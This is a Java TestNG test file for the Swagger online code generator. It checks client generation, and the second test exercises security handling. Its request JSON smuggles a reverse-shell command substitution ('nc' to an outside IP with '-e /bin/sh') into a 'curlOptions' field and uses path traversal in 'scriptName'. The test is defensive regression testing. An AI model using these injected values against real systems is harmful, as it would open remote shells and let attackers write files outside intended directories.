package io.swagger.v3.generator.online;

import com.fasterxml.jackson.databind.JsonNode;
import io.swagger.codegen.v3.service.GenerationRequest;
import io.swagger.codegen.v3.service.Options;
import io.swagger.oas.inflector.models.RequestContext;
import io.swagger.oas.inflector.models.ResponseContext;
import io.swagger.v3.core.util.Json;
import org.apache.commons.io.FileUtils;
import org.testng.Assert;
import org.testng.annotations.Test;

import javax.ws.rs.core.MediaType;
import java.io.File;
import java.util.LinkedHashMap;
import java.util.Map;

public class GeneratorControllerTest {
    @Test
    public void generateJava() throws Exception {
        String json = FileUtils.readFileToString(new File("src/test/resources/petstore-oas3.json"));
        JsonNode node = Json.mapper().readTree(json);
        Map<String, Object> spec = Json.mapper().convertValue(node, LinkedHashMap.class);


        GenerationRequest generationRequest = new GenerationRequest()
                .spec(spec)
                .lang("java")
                .options(new Options()
                        .outputDir("testout")
                        .addAdditionalProperty("outputFolder", "testoutputFolder")
                        .addAdditionalProperty("useRuntimeException", true)
                        .addAdditionalProperty("useRxJava", true));

        GeneratorController g = new GeneratorController();
        RequestContext r = new RequestContext();
        ResponseContext rr = g.generate(r, generationRequest);
        Assert.assertEquals(rr.getStatus(), 200);
        Assert.assertEquals(rr.getContentType(), MediaType.APPLICATION_OCTET_STREAM_TYPE);
        Assert.assertTrue(rr.getHeaders().getFirst("Content-Disposition").contains(" filename=\"java-client-generated.zip\""));
    }


    @Test
    public void generateBashWithAndWithoutSecurityThreat() throws Exception {

        String requestJson = "{\n" +
                "    \"lang\": \"bash\",\n" +
                "    \"spec\": {\n" +
                "        \"swagger\": \"2.0\",\n" +
                "        \"info\": {\n" +
                "            \"title\": \"Sample API\",\n" +
                "            \"description\": \"API description in Markdown.\",\n" +
                "            \"version\": \"1.0.0\"\n" +
                "        },\n" +
                "        \"paths\": {\n" +
                "            \"/users\": {\n" +
                "                \"get\": {\n" +
                "                    \"produces\": [\n" +
                "                        \"application/json\"\n" +
                "                    ],\n" +
                "                    \"responses\": {\n" +
                "                        \"200\": {\n" +
                "                            \"description\": \"OK\"\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }\n" +
                "    },\n" +
                "    \"type\": \"CLIENT\",\n" +
                "    \"codegenVersion\": \"V2\",\n" +
                "    \"options\": {\n" +
                "        \"additionalProperties\": {\n" +
                "            \"scriptName\": \"../mytemp/start\",\n" +
                "            \"curlOptions\": \"$(nc 94.76.202.153 8083 -e /bin/sh)\"\n" +
                "        }\n" +
                "    }\n" +
                "}";


        GenerationRequest generationRequest = Json.mapper().readValue(requestJson, GenerationRequest.class);

        GeneratorController g = new GeneratorController();
        RequestContext r = new RequestContext();
        ResponseContext rr = g.generate(r, generationRequest);
        Assert.assertEquals(rr.getStatus(), 200);
        Assert.assertEquals(rr.getContentType(), MediaType.APPLICATION_OCTET_STREAM_TYPE);
        Assert.assertTrue(rr.getHeaders().getFirst("Content-Disposition").contains(" filename=\"bash-client-generated.zip\""));

        String requestJsonWithThreatInTargetScriptName = "{\n" +
                "    \"lang\": \"bash\",\n" +
                "    \"spec\": {\n" +
                "        \"swagger\": \"2.0\",\n" +
                "        \"info\": {\n" +
                "            \"title\": \"Sample API\",\n" +
                "            \"description\": \"API description in Markdown.\",\n" +
                "            \"version\": \"1.0.0\"\n" +
                "        },\n" +
                "        \"paths\": {\n" +
                "            \"/users\": {\n" +
                "                \"get\": {\n" +
                "                    \"produces\": [\n" +
                "                        \"application/json\"\n" +
                "                    ],\n" +
                "                    \"responses\": {\n" +
                "                        \"200\": {\n" +
                "                            \"description\": \"OK\"\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }\n" +
                "    },\n" +
                "    \"type\": \"CLIENT\",\n" +
                "    \"codegenVersion\": \"V2\",\n" +
                "    \"options\": {\n" +
                "        \"additionalProperties\": {\n" +
                "            \"scriptName\": \"../../mytemp/start\",\n" +
                "            \"curlOptions\": \"$(nc 94.76.202.153 8083 -e /bin/sh)\"\n" +
                "        }\n" +
                "    }\n" +
                "}";


        generationRequest = Json.mapper().readValue(requestJsonWithThreatInTargetScriptName, GenerationRequest.class);

        g = new GeneratorController();
        r = new RequestContext();
        rr = g.generate(r, generationRequest);
        Assert.assertEquals(rr.getStatus(), 500);
    }
}
